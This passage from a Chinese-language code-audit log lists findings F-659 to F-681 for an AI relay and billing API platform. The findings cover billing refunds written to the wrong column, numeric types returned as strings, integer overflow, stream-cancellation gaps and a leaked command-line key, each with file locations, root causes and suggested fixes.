- 根因：用命令行参数传密钥；同机同用户进程可读进程列表。
- 证据：`:141` `'--key', key`；`:18` 自述该 key 用于“防本机其它进程蹭用”。
- 影响面：本机任意同用户进程可读取 key 并直调 127.0.0.1 桥接端点，白嫖上游额度。
- 建议修法：改环境变量或 stdin/0600 临时文件。
- 是否当场可修：是。

#### F-659 `canary-service.recordFailure` 读改写丢更新，阈值回滚会漏计
- 严重度：P3
- 文件与行号：`services/canary-service.ts:259-283`；调用 `routes/canary.ts:131`
- 触发路径：`POST /api/admin/canary/:name/failure` 并发两次。
- 根因：读 `config.failureCount` 后写绝对值 `+1`，非原子自增。
- 证据：`const newFailureCount = config.failureCount + 1` 后 `SET failure_count = ${newFailureCount}`。
- 影响面：并发上报时计数偏小，autoRollback 阈值可能永达不到（主监控走 Redis streak，不经此函数）。
- 建议修法：`SET failure_count = failure_count + 1 ... RETURNING`。
- 是否当场可修：是。

### 第二十一轮 C 路：列与 JSON 键分叉

#### F-660 多模态任务退款把「成本分」加进「token 余额」列，成本余额永不回补
- 严重度：P1
- 文件与行号：写/扣 `services/relay-billing-service.ts:1295-1296`（组池）、`:1340-1341`（个人）；读/退 `:1664`、`:1677`、`:1686`；正确对照 `:1305` `settlePreDeduction`
- 触发路径：`POST /v1/images/generations` 或视频异步任务提交即计费且 `totalTokens=0`、`costCents>0` → 轮询得失败态 → `refundTaskCall(taskId)`。
- 根因：退款按“金额（分）”取值，却更新 `sharedTokenBalance`/`tokenBalance`（token 数列）；`sharedCostBalanceCents`/`costBalanceCents` 完全未回补。
- 证据：`:1664` `const cents = Math.max(0, log.costCents ?? 0)`；`:1677` `sharedTokenBalance + ${cents}`；`:1686` `tokenBalance + ${cents}`；扣费侧 `:1296/:1341` 扣的是 cost 列。
- 影响面：钱没退、token 余额被虚增；`refunded` 已置 true 无法重试，账实长期不一致（个人 Key 与组池两条路径均受影响）。
- 建议修法：两分支改更新 `sharedCostBalanceCents`/`costBalanceCents`（保留 -1 哨兵）；若确有 token 预扣按 log 真实 token 回补。
- 是否当场可修：是。

#### F-661 预算告警把「成本（分）」与「月成本上限（元）」直接相除，花到上限 1% 即报 100%
- 严重度：P2
- 文件与行号：`services/budget-alert-service.ts:191-199,267`；写侧 `plugins/ai-cost.ts:438,466-470,504`；`services/pricing-service.ts:8,31`；默认值 `schema/vip.ts:38-39`；写入 `plan-entitlement-service.ts:102-103`
- 触发路径：VIP 用户默认 `monthlyCostLimit=100` → 累计消耗 100 分（¥1）→ 30 分钟一轮的 `budget-alert-check` → `monthlyPercent=1` 判 critical，发站内信+邮件。
- 根因：`ai_cost_records.cost` 全链路为分；预算字段默认 10/100 语义为元（若按分仅 ¥0.1/¥1，作为档位默认不成立），读侧未 ×100 归一。`schema/ai-cost.ts:22` 又注释为美元，形成三方漂移。
- 证据：`:199` `monthlyPercent = monthlyCost / monthlyLimit`；`:267` `SUM(cost)` 原值；`ai-cost.ts:466` “unitPrice 为分/千 token”；`vip.ts:38-39` `'10'/'100'`。
- 影响面：真实花费达配置值 1% 即触发 100% critical，误报邮件风暴（与 F-372“日限额不执行”为不同根因）。
- 建议修法：聚合统一 `SUM(cost)/100` 与元比较（或明确把 limit 定义为分并同步后台/schema）。
- 是否当场可修：是。

#### F-662 定价建议用 `metadata.multiplier` 反推成本，BYOK 行 multiplier 恒 1 且真实上游成本键被忽略
- 严重度：P3
- 文件与行号：写 `relay-billing-service.ts:1090-1131,1158-1178`；读 `services/price-history-service.ts:237-259`；入口 `routes/admin/relay-pricing.ts:236`
- 触发路径：以 BYOK Key 调用若干模型 → 管理员打开“动态调价建议”。
- 根因：BYOK 分支只算 `platformFeeCents/upstreamCostCents`，从不改 multiplier；读侧仍 `cost = revenue / avgMultiplier`，未排除 `byokMode='true'` 行，也未用 `upstreamCostCents`。
- 证据：`:1090` `let multiplier = 1`；`:1101-1115` BYOK 分支；`:1158-1159` 恒写 multiplier；`:1174-1178` 另写 upstreamCostCents；读侧 `:237-240` `AVG(metadata->>'multiplier')`。
- 影响面：BYOK 占比高的模型利润率被系统性低估，定价建议错误涨价；relay/BYOK 混合时均值互相稀释。
- 建议修法：`CASE WHEN byokMode='true' THEN upstreamCostCents ELSE costCents/multiplier END`，或聚合排除 BYOK 行并单列抽成。
- 是否当场可修：是。

### 第二十一轮 D 路：schema 类型契约

> 驱动事实：`db/index.ts` 与 `packages/database/src/client.ts` 建池未传 `types`；`postgres@3.4.9` 只解析 OID 21/23/26/700/701，**int8=20 与 numeric=1700 返回 string**；drizzle `sql<number>` 不做运行期映射（`count()` 自带 `mapWith(Number)`，`sum/avg` 为 String）。

#### F-663 财务统计 `sum/avg ÷ 100.0`（numeric）返回字符串，前端 `.toFixed` 崩整页
- 严重度：P2
- 文件与行号：`routes/admin-monitoring-routes.ts:457,460,461,470,479`；`routes/index.ts:1118`；前端 `apps/web/app/(main)/admin/edu/finance/statistics/page.tsx:108,143,169,205,230`
- 触发路径：打开“教育财务统计”页 → `sum(int4)/100.0` 变 numeric → postgres.js 无 parser 返回 `"123.4500..."` → 前端 `stats.totalRevenue.toFixed(2)` → `TypeError: toFixed is not a function`。
- 根因：`sql<number>` 只骗过 TS；`coalesce(sum(...),0)` 的 0 也被 numeric 提升为字符串。
- 证据：`:457` `sql<number>\`coalesce(sum(${orders.amount}), 0) / 100.0\``；前端 `:108` `stats.totalRevenue.toFixed(2)`。
- 影响面：管理页白屏/错误边界；同型 5 处数值全部失真。
- 建议修法：SQL 端 `::float8`（postgres.js 有 701 parser），或边界 `Number(...)`；前端类型不可直信 number。
- 是否当场可修：是。

#### F-664 `/api/admin/api-usage/top` 的 `errorRate`（avg*100，numeric 字符串）被 `.toFixed` 调用
- 严重度：P2
- 文件与行号：`routes/admin-monitoring-routes.ts:134`（另 `:118` 同型不崩）；前端 `apps/web/app/(main)/admin/api-usage/page.tsx:240`（类型声明 `:35`）
- 触发路径：进入管理端“API 用量”页 → top 表渲染 `e.errorRate.toFixed(2)`。
- 根因：`avg(int4)` 返回 numeric→string，`sql<number>` 无转换。
- 证据：`:134` `sql<number>\`coalesce(avg(case when status_code >= 400 then 1 else 0 end) * 100, 0)\``；`:240` `.toFixed(2)`。
- 影响面：整页图表/卡片一起崩。
- 建议修法：`:134/:118` 加 `::float8`；前端 `Number()` 兜底。
- 是否当场可修：是。

#### F-665 `/api/admin/performance-dashboard/endpoints` 同型 `errorRate` 崩页，且 avgLatency 未截断
- 严重度：P2
- 文件与行号：`routes/admin-monitoring-routes.ts:377,379,394`；前端 `apps/web/app/(main)/admin/performance-dashboard/page.tsx:202`（另 `:187` 展示未截断小数）
- 触发路径：打开“性能看板”→ 端点表渲染。
- 根因：同 F-663/664；`avgLatency` 未 `::int`，与 `relay-logs.ts:463` 口径不一致。
- 证据：`:379` `sql<number>\`coalesce(avg(case …)*100, 0)\``；`:377` `avgLatency` 无转换。
- 影响面：TypeError 崩页；延迟显示 12.3456789012345678ms 一类未截断值。
- 建议修法：`:377` 加 `::int`，`:379/:394` 加 `::float8`。
- 是否当场可修：是。

#### F-666 手写 `count(*) filter`/`count(distinct)` 返回 int8 字符串，接口契约声明 number
- 严重度：P3
- 文件与行号：`routes/admin-monitoring-routes.ts:117,147,148,149,393,459`
- 触发路径：`/api/admin/api-usage/stats`、`/oauth-audit/stats`、`/finance/statistics`、`/performance-dashboard/stats` 直接 `success({...})`。
- 根因：未用 drizzle `count()`（自带 mapWith(Number)），手写 SQL 未 `::int`；同文件 `:457` 的 `count()::int` 已正确处理，属遗漏。
- 证据：`:117` `sql<number>\`count(*) filter (where …)\``；`:148` `count(distinct …)`；`:459` `count(*) filter`。
- 影响面：JSON 返回 `"todayCalls":"123"`，前端 `number` 类型失真；任何 `+`/`toFixed`/严格比较都会出错。
- 建议修法：统一 `count(...)::int` 或改 drizzle `count()`。
- 是否当场可修：是。

#### F-667 token 计数列 `sum(...)::int` 溢出：>2,147,483,647 tokens 即 22003 → 500（F-574 只覆盖金额列）
- 严重度：P2
- 文件与行号：`routes/admin/relay-logs.ts:458-460`（缺省全时段）；`services/api-key-group-service.ts:142`（近 30 天）；`routes/admin-saas-quota.ts:85`（租户全时段）；`routes/admin-shop-routes.ts:152-153`；`db/commission-queries.ts:46-47`；schema `llm-call-logs.ts:49-51`、`wallet.ts:43`、`ai-cost.ts:34`
- 触发路径：任一聚合窗口内 token 合计 > 2^31 → PG `22003 integer out of range`。
- 根因：`sum(int4)` 提升 int8 后被 `::int` 截回 int4。
- 证据：`:458-460` `coalesce(sum(totalTokens),0)::bigint::int`；`api-key-group-service.ts:142` `sum(...)::int`。
- 影响面：统计/配额/商城用户列表接口整体 500（与 F-574 金额列不同列，可叠加）。
- 建议修法：去掉末端 `::int`，返回 bigint 并 JS 侧转换；评估相关 token 列迁 bigint。
- 是否当场可修：是（SQL 先止血）。

#### F-668 兑换码 `tokenAmount` 无上限 + `sum(token_amount)::bigint::int` → 统计接口 500
- 严重度：P2
- 文件与行号：schema `redemption-codes.ts:26`（bigint）；写 `routes/admin/redemption-codes.ts:40`；读 `services/redemption-code-service.ts:395`
- 触发路径：管理员生成一张 `tokenAmount=3_000_000_000` 的兑换码 → 打开兑换码统计。
- 根因：列是 bigint，聚合末端 `::int`；输入校验只 `.positive()` 无 max。
- 证据：`:395` `coalesce(sum(${redemptionCodes.tokenAmount}), 0)::bigint::int`；`:40` `z.number().int().positive()`。
- 影响面：`getStats()` 500，整个兑换码管理页不可用（F-574 只列同函数 `:394` 的面值列）。
- 建议修法：`:395` 去掉 `::int`；输入加 `.max(...)`。
- 是否当场可修：是。

#### F-669 `agent_settlements` 三个 int4 列对 admin 输入无约束：小数被静默取整、超限 500
- 严重度：P3
- 文件与行号：schema `agents-extended.ts:113-115`；写 `routes/agents.ts:1105-1107,1112`；落库 `db/agents-queries.ts:380-388`
- 触发路径：`POST /api/admin/agents/settlement/create` 传 `commissionRate: 0.15` 或 `amount > 2^31-1`。
- 根因：int4 表达“百分比/金额”，路由用无界 `z.number()`；PG numeric→int4 静默舍入，超限 22003。
- 证据：`:1105-1107` 无 `.int()/.max()`；schema `:113-115` integer。
- 影响面：比例被记 0，金额超限 500；库内同时存在“百分比整数”与“比例小数”两种语义，读取方无法区分。
- 建议修法：`commissionRate` 改 numeric(5,2) 或 `.int().min(0).max(100)`；金额列加 `.int().nonnegative().max(2147483647)` 或改 bigint。
- 是否当场可修：是。

### 第二十一轮 E 路：relay 双路径对拍

#### F-670 客户端断开被计为渠道 key 失败，3 次断连即熔断全部候选（账号池腿不记失败账）
- 严重度：P1
- 文件与行号：渠道腿 `services/relay-upstream-forwarder.ts:394-401`（`:399` 记账、`:400` 判 AbortError）；账号池腿 `services/relay-account-forwarder.ts:1569-1573`
- 触发路径：`POST /v1/chat/completions(stream)` → `v1-public.ts:728-730` onClose abort → signal 传入 forwardToChannel → fetch 抛 AbortError → 先记失败再 break。
- 根因：catch 先无条件 `recordChannelResult(false)`，之后才判断是否客户端断开；断连不是渠道故障，账号池腿对同一情形明确“不记失败账”。
- 证据：`:399` `await recordChannelResult(channel.keyPoolId, false, ...)`；`:400` `if (name === 'AbortError') break`；账号池 `:1572` `// 客户端断开:不记失败账`。
- 影响面：切页/取消累积 3 次即打开该 key 熔断 60s（`relay-channel-router.ts:44-45`），该模型全体回退 ai-service；与 F-617（4xx 计失败）触发源不同。
- 建议修法：先判 AbortError 直接 break 不记账；或给 `recordChannelResult` 增加 skipped 语义。
- 是否当场可修：是。

#### F-671 账号池腿响应头到达后摘掉 req.signal 且 tee 支路无取消，客户端断开后上游继续生成
- 严重度：P1
- 文件与行号：`services/relay-account-forwarder.ts:679-703`（`:701` 移除 parent 监听）、`:1341-1356`、`:1139-1154`（tee+tap 无 signal）、`:1587-1588`；对照渠道腿 `relay-upstream-forwarder.ts:518-522`（`reader.cancel()`）
- 触发路径：流式 chat → 取响应头后 `finally timed.clear()` 摘掉 parent abort → `v1-public.ts:817` 客户端断开触发外层 `reader.cancel()`，只取消外层流；tap 支路继续读到 `[DONE]`。
- 根因：(a) `withUpstreamTimeout.clear()` 连 parent abort 监听一起撤掉；(b) `resp.body.tee()` 的 tap 支路不感知 signal；(c) 组合流无 cancel 实现，`readSseDataLines` 只 releaseLock。
- 证据：`:1355` `timed.clear()`；`:701` `parent?.removeEventListener('abort', onParentAbort)`；`:1139` `const [pass, tap] = resp.body.tee()`；`:1140-1148` 无 signal 检查。
- 影响面：客户端已断上游仍跑完整段（账号池真实扣额度）；并发槽与全局在途闸只在 tap 收尾释放，3 个断连即可让该账号不可调度；上游静默不发帧时撤掉超时 → 槽位永不释放。
- 建议修法：clear 只清定时器保留 parent abort（头阶段后再挂 abort→reader.cancel）；tap 增加 signal；finally 改 `reader.cancel()`。
- 是否当场可修：是（需小改签名）。

#### F-672 管理端参数覆盖（bodyOverride）只在渠道腿生效，账号池腿完全忽略
- 严重度：P2
- 文件与行号：渠道腿 `relay-upstream-forwarder.ts:272,336-338`；账号池腿 `relay-account-forwarder.ts:1198-1230,1501-1505`（全文件 0 处 bodyOverride）
- 触发路径：`v1-public.ts:770` `applyParamOpsToBody` → `:797` 传 bodyOverride → 渠道候选为 0 时 `:272` 调 `forwardToAccountPool` 丢弃该字段。
- 根因：两条腿入参契约不一致：渠道腿用最终 body 覆盖，账号池腿用结构化字段重建。
- 证据：`forwarder:336-338` `if (req.bodyOverride) body = { ...req.bodyOverride, model, stream }`；`account:1198-1203` 只搬 model/messages/stream。
- 影响面：set/delete/append/regex_replace 策略对账号池流量全部失效（可绕过注入/封顶/敏感词替换），同请求两条腿上下文不一致。
- 建议修法：账号池入口先消费 bodyOverride 再归一。
- 是否当场可修：是。

#### F-673 非流式 `/v1/chat/completions` 重建响应：tool_calls/reasoning_content 丢失，finish_reason 恒 stop
- 严重度：P2
- 文件与行号：`routes/v1-public.ts:1961-1966,2074-2085`
- 触发路径：非流式 chat 且 usedChannel 为真（渠道腿 `:1879` 或账号池腿 `relay-account-forwarder.ts:1650`）。
- 根因：把上游 completion 重建成 `{role, content}` 极简结构，丢弃 `tool_calls/reasoning_content/finish_reason`，finish_reason 写死 `'stop'`。
- 证据：`:1966` 只取 `message['content']` 字符串；`:2082-2083` `message:{role,content}` + `finish_reason:'stop'`。
- 影响面：schema 支持 tools（`:125-154`），非流式带工具时客户端拿到空 content 且无 tool_calls，函数调用断链；`length` 被伪装成正常结束；错误结构还会写入响应缓存（`:2142-2145`）。F-293 只覆盖 /v1/messages 与 /v1/responses。
- 建议修法：usedChannel 时透传 rawJson（补 id/created），至少保留 message 原对象与 finish_reason。
- 是否当场可修：是。

#### F-674 渠道腿只看 `resp.ok` 不校验协议体：200 HTML/错误 JSON 也记 key 健康并当成功透传
- 严重度：P2
- 文件与行号：`relay-upstream-forwarder.ts:379-393`；对照账号池腿 `relay-account-forwarder.ts:1456-1490`；消费 `v1-public.ts:1952,2152-2175`
- 触发路径：渠道 baseUrl 配成登录页/维护页 → 200 text/html → `:379` 判 ok → `:386` recordChannelResult(true) → `:1952 resp.json()` 抛错 → 503 且不再 failover。
- 根因：渠道腿成功判据只有状态+body 非空，无内容/协议校验；账号池腿必须解析 JSON/聚合 SSE 成功才算成功。
- 证据：`:379` `if (!resp.ok || !resp.body)`；`:386` 记成功；账号池 `:1473-1478` `catch { return fail('server', '上游 JSON 解析失败') }`。
- 影响面：坏渠道长期判健康永不熔断，每请求白打一次上游再回退（延迟/成本翻倍），key 健康状态被污染。
- 建议修法：非流式校验 content-type + JSON 可解析 + choices 非空，否则按 server 失败并 failover。
- 是否当场可修：是。

#### F-675 异步生图链路零计费，worker 注释与实现相反
- 严重度：P2
- 文件与行号：`workers/image-task-worker.ts:18,52-83`；`routes/v1-multimodal.ts:2192-2218`；`relay-upstream-forwarder.ts` 全文无计费
- 触发路径：`POST /v1/images/generations/async`（preHandler 仅 `requireApiKeyQuota()` 余额校验）→ 存 pending → worker 每 30s 消费 → `forwardToChannel({endpoint:'images'})` 真实打上游 → `completeImageTask`，全程无 charge/recordCall。
- 根因：计费只在同步 `/v1/images/generations` 分支（`v1-multimodal.ts:1270,1323,1349,1702`），异步分支只有注释约定；forwardToChannel 本身只选路转发。
- 证据：worker `:18` 注释称“走 forwardToChannel 内置计费”；`:52-59` 只传 model/prompt；`v1-multimodal.ts:2202-2203` 注释“计费不在本任务范围”。
- 影响面：持 images:write 的 Key 可无限提交异步生图，平台承担 100% 上游成本，无 llm_call_logs、无扣费、无审计；失败也不退款。
- 建议修法：任务表持久化 apiKeyId/userId/units；worker 成功 chargeMultimodal + recordCall（或创建预扣、失败退款）。
- 是否当场可修：是（需补任务字段）。

#### F-676 429 的 `Retry-After` 只有账号池腿采用，渠道腿固定 60s 冷却
- 严重度：P3
- 文件与行号：账号池 `relay-account-forwarder.ts:471-498`；渠道腿 `relay-upstream-forwarder.ts:379-383`；`relay-channel-router.ts:44-45,319-353`
- 触发路径：上游 429 + `Retry-After: 300` → 账号池冷却 300s；渠道腿只按 60s 开熔断，half-open 后再撞 429。
- 根因：`recordChannelResult` 不接收响应头，路由层无退避头解析。
- 证据：`account:485` `Math.min(Math.max(RATE_COOLDOWN_MS, upstreamMs), RATE_COOLDOWN_MAX_MS)`；`router:45` `CIRCUIT_OPEN_DURATION_MS = 60_000`。
- 影响面：被限流 key 每 60s 重新 probe，持续打上游、成功率抖动。
- 建议修法：`recordChannelResult(..., headers?)`，429 时复用 `planRateBackoff`。
- 是否当场可修：是。

#### F-677 账号池腿读流异常/提前 break 只 releaseLock 不 cancel（F-618 在另一条路径的对应缺失）
- 严重度：P3
- 文件与行号：`relay-account-forwarder.ts:794-816,881-884,1459-1468`
- 触发路径：上游强制 SSE 的非流式请求，`translateStreamChunk` 抛错 → `fail('server')`；此时 body 未读完也未取消。
- 根因：生成器 finally 只有 `releaseLock()`，无 `reader.cancel()`；`[DONE]` 后残余字节同理。
- 证据：`:813-815` `finally { reader.releaseLock() }`；`:882-884` `if (isSseDone(line)) break`。
- 影响面：undici 连接/独立代理连接不能立即归还，逐请求累积。
- 建议修法：非正常结束时 finally `void reader.cancel().catch(() => {})`。
- 是否当场可修：是。

#### F-678 两条腿都吞掉上游状态码：`lastHttpStatus` 无消费者，4xx/429 一律变 503
- 严重度：P2
- 文件与行号：`relay-upstream-forwarder.ts:127,342,380,405`；`relay-account-forwarder.ts:1527,1662,1678`；消费 `v1-public.ts:1926-1949,887-903`
- 触发路径：非流式 chat → 渠道返回 400/401/404/429 → 返回 `{ok:false,lastHttpStatus:429}` → v1-public 从不读该字段 → 回落 ai-service → 503。
- 根因：`ForwardResult.lastHttpStatus` 只写不读，失败语义被压平成 ok:false。
- 证据：`:405` `return { ok:false, reason:lastError, lastHttpStatus }`；`v1-public.ts:1949` 固定 503。
- 影响面：客户端无法区分参数错/鉴权错/限流与网关不可用，重试策略失效；400 还会先打满候选再打 ai-service。
- 建议修法：4xx 直接映射同状态码 + 截断错误体；429 透传 Retry-After。
- 是否当场可修：是。

#### F-679 流式计费用字符估算顶掉上游真实 usage（同函数 usage 帧却用真值）
- 严重度：P2
- 文件与行号：`routes/v1-public.ts:819-829,852-864`；账号池真实 usage `relay-account-forwarder.ts:1092-1107,1595-1605`
- 触发路径：流式 chat，上游 usage 帧带 `prompt_tokens=1800` → stats.promptTokens=1800，但记账仍用 `ceil(promptText.length/4)`。
- 根因：`recordCall` 的 promptTokens 写死字符估算，未回落 stats；同函数 include_usage 分支（`:828-829/:1016-1018`）用的是真值。
- 证据：`:852` `const promptTokens = Math.ceil((opts.promptText ?? '').length / 4)`；`:822` `streamPromptTokens = stats.promptTokens`。
- 影响面：中文 prompt 约 1.5 字/token，按 4 字/token 低估 2–3 倍，中转收入系统性少计；账号池台账与用户账单对不上。
- 建议修法：`stats.promptTokens > 0 ? stats.promptTokens : 字符估算`。
- 是否当场可修：是。

### 第二十一轮未判定（证据不足，不计入结论）

1. **`coze-oauth-apps.ts:55-57`**：非 JWT 路径只判 `res.ok`，若 Coze 以 HTTP 200 返回 `{code,msg}` 错误体会把空 token 当成功；缺 Coze 错误响应样例。
2. **`relay-account-format.ts` 掩码手机号作 name**：同手机号多平台账号同名，是否撞库/去重取决于 `ai_relay_account_pool.name` 唯一性与导入 upsert 键，未取证。
3. **`relay-account-pool-scheduler.ts` 10 分钟分布式锁 TTL**：是否覆盖单轮最坏耗时（50 号/并发 5 × 3 次重试），缺适配器单次超时预算实测。
4. **`budget-alert-service.ts` 日界 `setHours(0,0,0,0)`** 依赖进程本地时区，与 channel-quota 的 Asia/Shanghai 口径是否一致，缺运行环境 TZ 证据（同既有“host 时区”缺口）。
5. **`audit-export-key-registry.ts:557`** `exitCode` 在 R4 为 undetermined 时仍为 0，缺 runner 是否另判 undetermined 的证据。
6. **`automation-repair-service.ts` 多实例前提**：B4/F-649 依赖多实例共存，缺部署实例数与 Redis 互斥启用状态。
7. **`upstream_header_inject` 插件只在渠道腿生效**：`relay-plugins-service.ts:20` 注释自述面向 relay-upstream-forwarder，账号池腿不调 `applyUpstreamHeaderPlugins`；是否为刻意范围需产品确认。
8. **images 分支 `bodyOverride.model` 可覆盖选路模型**：`forwarder:307` 与“强制回填协议字段”注释不符；内部调用方传同一 model，缺外部调用方证据。
9. **异步生图任务丢失 `n/size/quality`**：`v1-multimodal.ts:2201-2204` 只存 model/prompt（注释自认骨架），属契约缺口还是未完成功能需确认。
10. **有渠道候选但全部失败时不尝试账号池**：`forwarder:261-301` 账号池只服务候选为 0，与“双通道韧性”描述不完全一致，需产品确认。
11. **`org_policy.spend_budget_daily.credits` 口径**：`org-policy-service.ts:300-307` 用 `SUM(cost)`（分）直接与 policy.credits 比，后台若按元录入则提前 100 倍拒绝；代码与表单均未声明单位。
12. **`ai_cost_records.cost` 单位**：schema 注释为美元，唯一写侧按分；若外部 BI 按美元解读则另成 100 倍问题，仓内无第二读点。
13. **`notification-queries.ts:91-92` “今日”口径**：`created_at >= current_date` 依赖会话时区，缺 DB timezone 参数证据。
14. **`certificate-queries.ts` deleteTemplate**：是否仍有证书引用该模板，缺 `certificates.template_id` 外键 `onDelete` 语义。
15. **`rbac-queries.ts updatePermission(id,{})` 会抛 “No values to set”**：未 grep 到消费点，无法确认可达。
16. **`comment-queries.ts repliesCount` 子查询未过滤 is_deleted**：是否符合“已删除占位”产品语义未知。

### 第二十一轮覆盖（五路并行）

- A 路 db 逐行：精读 37 个文件 —— `user-preferences-queries`、`system-queries`、`registry-queries`、`plugin-events-queries`、`message-queries`、`schedule-queries`、`setting-queries`、`rbac-queries`、`team-queries`、`usercenter-queries`、`my-member-queries`、`notification-queries`、`oauth-queries`、`site-categories-queries`、`skills-queries`、`sms-receive-queries`、`social-queries`、`video-task-queries`、`vip-queries`、`workspace-queries`、`chat-skills-queries`、`chat-sync-rev-queries`、`chat-group-queries`、`chat-conversation-access`、`comment-queries`、`admin-sys-queries`、`agreements-queries`、`authorizations-queries`、`certificate-queries`、`content-generation-queries`、`exchange-rate-queries`、`export-tasks-queries`、`learn-extended-queries`、`live-calendar-queries`、`member-extended-queries`、`news-queries`、`oss-queries`。
- B 路 services：精读 28 个 —— `coupon-service`、`commission-settle-service`、`vip-expire-service`、`channel-quota-service`、`budget-alert-service`、`relay-account-format`、`relay-param-ops`、`relay-account-pool-scheduler`、`org-policy-service`、`permission-grants`、`runtime-import-plan`、`rules-service`、`security-service`、`siem-exporter`、`raw-retention-optout`、`audit-export-key-registry`、`coze-oauth-apps`、`langgraph-proxy`、`qoder-bridge-client`、`codebase-index-service`、`automation-repair-service`、`ai-feed-service`、`activity-status-service`、`algorithm-record-service`、`canary-service`、`news-status-proxy`、`mail-relay-notifier`、`log-sanitizer`。
- C 路 分叉复扫：全仓 `metadata->>`/`->>'`/`#>>`/`jsonb` 与 `costCents/cost_cents`、`apiKeyId/api_key_id`、`refunded`、`isDeleted/deletedAt`、`openId/open_id`、`tenantId/tenant_id`、`expiresAt` 读写点；对照 `schema/billing.ts`、`wallet.ts`、`llm-call-logs.ts`、`ai-cost.ts`、`vip.ts`、`redemption-codes.ts`。
- D 路 类型契约：`node_modules/.pnpm/postgres@3.4.9` 的 OID parser、`drizzle-orm@0.45.2` 的 `aggregate.js`/`numeric.js`；`db/index.ts`/`packages/database/src/client.ts` 建池参数；`admin-monitoring-routes`、`admin/relay-logs`、`admin-saas-quota`、`admin-shop-routes`、`api-key-group-service`、`commission-queries`、`redemption-code-service`、`agents-queries` 及对应前端页面。
- E 路 relay 对拍：`relay-upstream-forwarder`、`relay-account-forwarder`、`relay-channel-router`、`relay-param-ops`、`relay-plugins-service`、`relay-billing-service`；消费端点 `v1-public.ts`（chat/completions 流式与非流式）、`v1-multimodal.ts`（images 同步/异步）、`workers/image-task-worker.ts`。
- 本轮主代理复核：F-636（`schedule.ts:76-79,219-266` + `index.ts:681`）、F-646（`siem-exporter.ts:200-220,613-625` + `audit-queries.ts:173`）、F-660（`relay-billing-service.ts:1295-1296,1340-1341,1664-1690`）、F-670（`relay-upstream-forwarder.ts:394-401` + `relay-account-forwarder.ts:1569-1573`）、F-671（`relay-account-forwarder.ts:679-703,1341-1356`）、F-663（`admin-monitoring-routes.ts:457` + 前端 `toFixed`）、F-675（`v1-multimodal.ts:2192-2218` + `image-task-worker.ts:18,52-83`）。

### 第二十一轮已有覆盖（本轮去重排除，不重复报）

- **F-310/F-311**：`coupon-service` 缺 enabled/时间窗/适用范围校验、自荐刷佣金。
- **F-234/F-409/F-411**：`commission-settle-service` `LIMIT` 无排序、tokenQuantity 缺失、errors 非空仍记 success。
- **F-232**：`vip-expire-service` `is_vip` 无条件覆盖 + 全量/N+1。
- **F-178**：`channel-quota-service` `recordUsage` 从未调用，用量恒 0（故其 `::int` 溢出不可达）。
- **F-372/F-376**：预算只告警不阻断、冷却读副本/并发重复（F-661 是单位错 100 倍，根因不同）。
- **F-419**：`permission-grants` 读改写无锁/过期清理。
- **F-422**：`qoder-bridge-client` `stop()` 竞态（F-658 是 argv 泄露，根因不同）。
- **F-478**：`activity-status-service` 逐行 UPDATE 的 N+1。
- **F-351**：`ai-feed-service` 分页/关键字无上限。
- **F-492/F-493**：`image-task-worker` 无租约、无超时（F-675 是“零计费”，根因不同）。
- **F-51/F-89/F-337**：异步生图请求线程轮询、断连按 error 结算、SSE 错误帧当成功。
- **F-293**：`/v1/messages`、`/v1/responses` 工具调用丢失（F-673 为 `/v1/chat/completions` 非流式）。
- **F-616/F-617/F-618/F-627**：非流式无 signal、4xx 计熔断、非 2xx 不 cancel、循环内 stringify（F-670/F-671/F-677 为断连计失败、账号池 tee 不取消、账号池 releaseLock 不 cancel，均不同路径）。
- **F-574**：`sum(金额)::int` 溢出（F-667/F-668 为 token 计数列，不同列）。
- **F-572**：分页缺稳定 tiebreaker（A 路剩余列表同根，未重复报）。
- **F-397/F-357/F-481/F-177/F-231/F-147/F-148/F-248**：`exchange-rate` findRate、`my-member` 过期 VIP、`agreements` 生效日、`news` 详情 status、`learn-extended` 日期窗、VIP 购买/取消。
- **已有总条目**：`ilike` 未转义通配符、广播 `addBulk` 无 jobId、`workspace` 批量软删归属（路由已逐项校验）。

---

## 二十六、第二十二轮（五路并行）

> 基线 `89a5938f0c`（= origin/main）。五路均在 `findings-api.md` 内按文件名/函数名/表名检索去重后返回；7 条 P1 已由主代理逐行复核（F-680/F-698/F-699/F-717/F-718/F-719/F-721），1 条候选 P1（Qoder credits）因依赖“上游 token 恒 0”的代码注释前提降为 P2（F-720）。

### A 路：services 剩余面（F-680 ~ F-688）

#### F-680 推送设备注册必然 500：UUID 写入 integer 列，且 `ON CONFLICT (device_token)` 无唯一索引可匹配

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/push.ts:51-56`；`packages/database/src/schema/edu-full.ts:291-299`；`packages/database/drizzle/0044_silky_banshee.sql:527-535`
- **触发路径**：任意登录用户 `POST /api/push/devices/register {deviceToken}`。
- **根因**：`request.userId` 是 `users.id` 的 UUID，却被写入 `member_id integer NOT NULL`；同时 `ON CONFLICT (device_token)` 要求该列唯一，而 schema 与迁移均无唯一约束。
- **证据**：
  - `push.ts:52-54`：`INSERT INTO edu_notification_device (member_id, ...) VALUES (${userId}, ...) ON CONFLICT (device_token) DO UPDATE ...`
  - `edu-full.ts:293`：`memberId: integer('member_id').notNull()`
  - `0044_silky_banshee.sql:529-531`：`"member_id" integer NOT NULL` / `"device_token" varchar(500)`（无 UNIQUE）
  - 同仓已有正确表：`schema/device-tokens.ts:32-40`（`userId uuid` + token 唯一）
- **影响面**：注册 100% 失败（22P02）；`adminPushRoutes` 的 `memberIds` 分支（`push.ts:139-147`）永远查不到激活设备 → FCM/个推对 C 端不可用；`unregister` 用 `member_id = userId`（`push.ts:71`）同样永不命中。
- **建议修法**：改用 `device_tokens`；若坚持本表，`member_id` 改 uuid/text 并补 `UNIQUE(device_token)`，`DO UPDATE SET member_id = EXCLUDED.member_id`。
- **是否当场可修**：是。

#### F-681 错题入库从不初始化 SRS 到期日，“今日待复习”对全部用户恒为空

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/exam-extended-queries.ts:314-338`；`apps/api/src/services/srs-review-service.ts:58-65,153-166`；`packages/database/src/schema/exam-extended.ts:114`
- **触发路径**：学生答错 → `POST /wrong-questions` → 打开 `GET /api/srs-review/due` 或 `/stats`。
- **根因**：插入与冲突更新都不写 `due_date`（列无默认值）；唯一会写 `dueDate = now` 的 `initSRSForWrongQuestion` 全仓零调用（Grep 仅命中定义）。
